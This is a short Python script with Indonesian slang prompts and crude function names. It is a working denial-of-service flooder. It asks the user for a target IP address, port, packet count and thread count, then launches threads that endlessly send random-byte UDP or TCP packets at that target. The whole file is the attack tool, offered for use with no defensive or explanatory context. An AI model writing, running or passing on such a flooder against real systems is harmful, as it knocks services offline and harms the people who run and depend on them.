import random
import socket
import threading
import os

os.system("clear")
print ("I LOVE YOU")
print ("JANGAN BEGITU YA LAIN KALI")
print ("MADEPAK MEN")
print ("DAH LAH LANGSUNG AJA GASS!!!")
ip = str(input("Ip Nya Bro:"))
port = int(input("Port Nya Bro:"))
choice = str(input("Gass Kah Bro?(Gas/Tidak):"))
times = int(input("Paket Nya Bro:"))
threads = int(input("Bayar Nya:"))
os.system("clear")
def memek():
	data = random._urandom(10021)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET DATANG!!!")
		except:
			print("[!] PAKET DATANG!!!")

def memek2():
	data = random._urandom(121)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET DATANG!!!")
		except:
			s.close()
			print("[*] PAKET DATANG!!!")

for y in range(threads):
	if choice == 'Gas':
		th = threading.Thread(target = memek)
		th.start()
	else:
		th = threading.Thread(target = memek2)
		th.start()